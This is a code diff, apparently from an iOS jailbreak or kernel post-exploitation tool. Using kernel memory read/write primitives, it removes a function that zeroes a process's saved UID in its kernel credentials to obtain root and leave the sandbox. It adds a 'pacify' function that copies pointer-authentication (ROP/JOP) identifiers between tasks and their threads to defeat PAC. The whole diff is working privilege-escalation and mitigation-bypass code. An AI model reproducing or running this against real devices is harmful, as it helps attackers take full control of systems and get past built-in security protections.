@@ -37,33 +37,6 @@ addr64_t read_pointer(addr64_t ptr_addr)
     return STRIP_PAC(ptr);
 }
 
-int safe_elevate(pid_t pid)
-{
-    addr64_t ucred_s = read_pointer(find_proc(pid) + __ucred_offset);
-
-    if (!ucred_s)
-    {
-        printf("Failed to read my ucred struct\n");
-        return 1;
-    }
-
-    if (wk32(ucred_s + __cr_svuid_offset, 0))
-    {
-        printf("Ucred writing failed!");
-        return 1;
-    }
-
-    // yes, setuid(0) need to be called twice - from taurine
-    if (setuid(0) || setuid(0) || setgid(0) || getuid()) // apparently this just works after nulling __cs_svuid??
-    {
-        printf("Elevation failed :( UID: %d ", getuid());
-        return 1;
-    }
-
-    printf("I'm freeee - UID: %d ", getuid());
-    return 0; // apparently getting root is enough to break out of sandbox?
-}
-
 addr64_t find_task_port(mach_port_name_t port)
 {
     // from here: https://github.com/jakeajames/multi_path/blob/master/multi_path/jelbrek/kern_utils.m
@@ -209,4 +182,33 @@ int entitle(pid_t pid, uint32_t target_task_flags, uint32_t target_cs_flags)
     wk32(csflags_addr, csflags);
 
     return 0;
+}
+
+int pacify(pid_t source, pid_t target)
+{
+// jop is included for completion's sake but it seems all processes have jop_id = 0xFEEDFACE
+    addr64_t source_task = read_pointer(find_proc_by_task(source) + __task_offset);
+    addr64_t target_task = read_pointer(find_proc_by_task(target) + __task_offset);
+
+    uint64_t source_jop = rk64(source_task + __jop_pid_offset);
+    uint64_t target_jop = rk64(target_task + __jop_pid_offset);
+
+    uint64_t target_rop = rk64(target_task + __rop_pid_offset);
+    uint64_t source_rop = rk64(source_task + __rop_pid_offset);
+
+    printf("target rop: %x, source rop: %x, target jop: %x, source jop: %x ", target_rop, source_rop, target_jop, source_jop);
+
+    wk64(target_task + __jop_pid_offset + sizeof(uint64_t), source_rop);
+    wk64(target_task + __jop_pid_offset, source_jop);
+
+    uint32_t thread_count = rk32(target_task + __thread_count_offset);
+    addr64_t target_thread = 0;
+
+    for (int i = 0; i < thread_count; i++)
+    {
+        target_thread = read_pointer(i == 0 ? target_task + __thread_offset : target_thread);
+
+        wk64(target_thread + __thread_jop_pid_offset, source_jop);
+        wk64(target_thread + __thread_rop_pid_offset, target_rop);
+    }
 }
